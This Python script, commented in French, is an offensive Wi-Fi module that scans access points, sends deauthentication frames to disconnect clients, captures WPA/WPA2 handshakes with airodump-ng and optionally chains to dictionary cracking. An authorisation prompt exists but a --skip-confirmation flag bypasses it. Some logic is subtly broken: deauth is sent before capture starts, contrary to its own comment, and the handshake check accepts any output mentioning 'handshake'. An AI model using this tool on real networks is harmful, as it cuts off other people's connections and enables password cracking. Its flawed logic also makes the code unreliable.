#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
CYBERDECK - Module Wi-Fi offensif (deauth + capture de handshake WPA)
Scan des points d'accès, désauthentification ciblée d'un client pour
forcer sa reconnexion, et capture du handshake WPA/WPA2 à ce moment.
Enchaîne automatiquement vers wpa_handshake_audit.py pour le test
par dictionnaire.

Refonte offensive de audit_wifi.py : on ne se contente plus d'écouter
les beacons, on provoque le handshake au lieu de l'attendre.

Nécessite une interface en mode monitor et des privilèges root.
À réserver à un AP de test que vous possédez, sur un canal dédié.
"""
from __future__ import annotations

import os
import sys
import time
import shutil
import signal
import argparse
import subprocess
from datetime import datetime, timezone

from scapy.all import (
    sniff, sendp, RadioTap,
    Dot11, Dot11Beacon, Dot11Elt, Dot11Deauth,
)
from reportlab.lib.pagesizes import letter
from reportlab.lib import colors
from reportlab.lib.styles import getSampleStyleSheet
from reportlab.platypus import (
    SimpleDocTemplate, Paragraph, Spacer, Table, TableStyle,
)

MODULE_VERSION = "1.0 (WIFI-Deauth-Capture)"
OBSERVATION_ORIGIN = "Attaque RF active (deauth 802.11 + capture EAPOL)"

_handshake_captured = {"found": False}


def require_tools() -> None:
    missing = [t for t in ("airodump-ng", "aircrack-ng") if not shutil.which(t)]
    if missing:
        print(f"[!] Outils manquants : {', '.join(missing)}. "
              "sudo apt install aircrack-ng", file=sys.stderr)
        sys.exit(1)


def scan_aps(iface: str, duree: int = 15) -> dict:
    """Écoute passive des beacons pour lister les APs (BSSID -> infos)."""
    aps = {}

    def handler(pkt):
        if pkt.haslayer(Dot11Beacon):
            bssid = pkt.addr2
            if bssid in aps:
                return
            try:
                ssid = pkt[Dot11Elt].info.decode(errors="ignore") or "<caché>"
            except Exception:
                ssid = "<erreur>"
            # Canal depuis l'élément DS Parameter Set (tag 3) si présent
            channel = None
            elt = pkt.getlayer(Dot11Elt)
            while elt:
                if elt.ID == 3 and elt.info:
                    channel = elt.info[0]
                    break
                elt = elt.payload.getlayer(Dot11Elt)
            aps[bssid] = {"ssid": ssid, "channel": channel}
            print(f"[+] AP : {ssid:<24} {bssid}  ch={channel}")

    print(f"[*] Scan des APs sur {iface} ({duree}s)...")
    sniff(iface=iface, prn=handler, timeout=duree, store=False)
    return aps


def set_channel(iface: str, channel: int) -> None:
    if channel:
        subprocess.run(["iw", "dev", iface, "set", "channel", str(channel)],
                       stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)


def deauth(iface: str, bssid: str, client: str, count: int) -> None:
    """Envoie des trames de désauthentification pour forcer la reconnexion."""
    target = client if client else "ff:ff:ff:ff:ff:ff"
    pkt = (RadioTap() /
           Dot11(addr1=target, addr2=bssid, addr3=bssid) /
           Dot11Deauth(reason=7))
    print(f"[*] Deauth x{count} vers {target} (AP {bssid})...")
    sendp(pkt, iface=iface, count=count, inter=0.1, verbose=False)


def capture_handshake(iface: str, bssid: str, channel: int,
                      out_prefix: str, timeout: int = 30) -> str | None:
    """Lance airodump-ng ciblé sur le BSSID pour capturer le handshake."""
    set_channel(iface, channel)
    cmd = [
        "airodump-ng", "--bssid", bssid,
        "-c", str(channel or 1), "-w", out_prefix,
        "--output-format", "pcap", iface,
    ]
    print(f"[*] Capture airodump-ng sur {bssid} ch={channel} ({timeout}s)...")
    proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    time.sleep(timeout)
    proc.send_signal(signal.SIGINT)
    try:
        proc.wait(timeout=5)
    except subprocess.TimeoutExpired:
        proc.kill()

    cap = f"{out_prefix}-01.cap"
    if os.path.isfile(cap):
        # Vérifie la présence d'un handshake avec aircrack-ng
        check = subprocess.run(["aircrack-ng", cap], capture_output=True, text=True)
        if "1 handshake" in check.stdout or "handshake" in check.stdout.lower():
            _handshake_captured["found"] = True
        return cap
    return None


def confirm_authorization(bssid: str, ssid: str) -> None:
    print("=" * 60)
    print(" CONFIRMATION D'AUTORISATION REQUISE")
    print("=" * 60)
    print(f"AP cible : {ssid} ({bssid})")
    print(
        "\nLa désauthentification coupe la connexion de clients Wi-Fi et émet "
        "sur la bande partagée 2,4 GHz. Elle ne doit viser qu'un AP de test que "
        "vous possédez, sur un canal dédié, en puissance réduite."
    )
    confirmation = input("\nResaisissez le BSSID cible pour confirmer : ").strip()
    if confirmation.lower() != bssid.lower():
        print("[!] Confirmation invalide. Arrêt.", file=sys.stderr)
        sys.exit(1)


def generate_pdf_report(bssid, ssid, channel, cap_file) -> str:
    session = os.getenv("CYBERDECK_SESSION_ID", "N/A")
    operator = os.getenv("CYBERDECK_OPERATOR", "Inconnu")
    scenario = os.getenv("CYBERDECK_SCENARIO", "N/A")
    timestamp_utc = os.getenv("CYBERDECK_UTC_TIME", "Inconnu")
    file_time = os.getenv("CYBERDECK_FILE_TIME",
                          datetime.now().strftime("%Y%m%d_%H%M%S"))
    run_ts = datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ")

    output_path = f"wifi_attack_{session}_{file_time}.pdf"
    doc = SimpleDocTemplate(output_path, pagesize=letter)
    styles = getSampleStyleSheet()
    elements = []

    elements.append(Paragraph("Attaque Wi-Fi - Deauth & Capture de Handshake", styles["Title"]))
    elements.append(Spacer(1, 8))
    elements.append(Paragraph(f"<b>Session / Scénario :</b> {session} / {scenario}", styles["Normal"]))
    elements.append(Paragraph(f"<b>Opérateur :</b> {operator}", styles["Normal"]))
    elements.append(Paragraph(f"<b>AP cible :</b> {ssid} ({bssid}) ch={channel}", styles["Normal"]))
    elements.append(Paragraph(f"<b>Version :</b> {MODULE_VERSION}", styles["Normal"]))
    elements.append(Paragraph(f"<b>Horodatage session (UTC) :</b> {timestamp_utc}", styles["Normal"]))
    elements.append(Paragraph(f"<b>Horodatage du test (UTC) :</b> {run_ts}", styles["Normal"]))
    elements.append(Paragraph(f"<b>Origine :</b> {OBSERVATION_ORIGIN}", styles["Normal"]))
    elements.append(Spacer(1, 15))

    elements.append(Paragraph("Résultat de la capture :", styles["Heading2"]))
    if _handshake_captured["found"]:
        elements.append(Paragraph(
            f"Handshake WPA/WPA2 capturé et enregistré ({cap_file}). "
            "Il peut maintenant être soumis à un test par dictionnaire hors ligne.",
            styles["Normal"]))
    elif cap_file:
        elements.append(Paragraph(
            f"Capture produite ({cap_file}) mais aucun handshake complet confirmé. "
            "Relancer en forçant une nouvelle reconnexion d'un client actif.",
            styles["Normal"]))
    else:
        elements.append(Paragraph(
            "Aucune capture produite. Vérifier le mode monitor et le canal.",
            styles["Normal"]))

    elements.append(Spacer(1, 15))
    elements.append(Paragraph("Limites (Méthodologie) :", styles["Heading2"]))
    elements.append(Paragraph(
        "La capture d'un handshake ne compromet rien en soi : elle n'ouvre la voie "
        "qu'à un test par dictionnaire hors ligne, dont le succès dépend de la force "
        "du mot de passe. Le WPA3 (SAE) résiste à cette capture. La deauth exploite "
        "l'absence de protection des trames de gestion (PMF/802.11w), activable côté AP.",
        styles["Normal"]))

    doc.build(elements)
    print(f"[+] Rapport PDF généré : {output_path}")
    return output_path


def main() -> int:
    if os.geteuid() != 0:
        print("[!] Ce module exige root. Relancez avec sudo -E.", file=sys.stderr)
        return 1
    require_tools()

    parser = argparse.ArgumentParser(description="Deauth + capture de handshake WPA.")
    parser.add_argument("-i", "--interface", default=os.getenv("CYBERDECK_INTERFACE", "wlan0mon"),
                        help="Interface en mode monitor.")
    parser.add_argument("-b", "--bssid", help="BSSID cible (sinon menu après scan).")
    parser.add_argument("-c", "--client", default="", help="MAC du client à déauthentifier (sinon broadcast).")
    parser.add_argument("--channel", type=int, help="Canal (sinon détecté au scan).")
    parser.add_argument("--deauth-count", type=int, default=10, help="Nombre de trames deauth.")
    parser.add_argument("--capture-time", type=int, default=30, help="Durée de capture (s).")
    parser.add_argument("--crack", metavar="WORDLIST",
                        help="Enchaîner wpa_handshake_audit.py avec ce dictionnaire.")
    parser.add_argument("--skip-confirmation", action="store_true")
    args = parser.parse_args()

    iface = args.interface
    bssid = args.bssid
    channel = args.channel
    ssid = "<inconnu>"

    if not bssid:
        aps = scan_aps(iface)
        if not aps:
            print("[!] Aucun AP détecté. Interface en mode monitor ?", file=sys.stderr)
            return 1
        print("\nAPs détectés :")
        indexed = list(aps.items())
        for idx, (b, info) in enumerate(indexed):
            print(f"  [{idx}] {info['ssid']:<24} {b}  ch={info['channel']}")
        sel = input("Numéro de l'AP cible : ").strip()
        try:
            bssid, info = indexed[int(sel)]
            ssid = info["ssid"]
            channel = channel or info["channel"]
        except (ValueError, IndexError):
            print("[!] Sélection invalide.", file=sys.stderr)
            return 1

    if not args.skip_confirmation:
        confirm_authorization(bssid, ssid)

    session = os.getenv("CYBERDECK_SESSION_ID", "local")
    file_time = os.getenv("CYBERDECK_FILE_TIME", datetime.now().strftime("%Y%m%d_%H%M%S"))
    out_prefix = f"handshake_{session}_{file_time}"

    # On lance la capture puis on déauthentifie pour provoquer le handshake.
    set_channel(iface, channel)
    deauth(iface, bssid, args.client, args.deauth_count)
    cap_file = capture_handshake(iface, bssid, channel or 1, out_prefix,
                                 timeout=args.capture_time)

    if _handshake_captured["found"]:
        print("[+] Handshake capturé.")
    else:
        print("[-] Pas de handshake confirmé (réessayer avec un client actif).")

    generate_pdf_report(bssid, ssid, channel, cap_file)

    # Enchaînement optionnel vers le crack par dictionnaire existant.
    if args.crack and cap_file and _handshake_captured["found"]:
        print(f"[*] Enchaînement vers wpa_handshake_audit.py...")
        subprocess.run([
            "python3", "wpa_handshake_audit.py",
            "-c", cap_file, "-b", bssid, "-w", args.crack,
        ])

    return 0


if __name__ == "__main__":
    raise SystemExit(main())
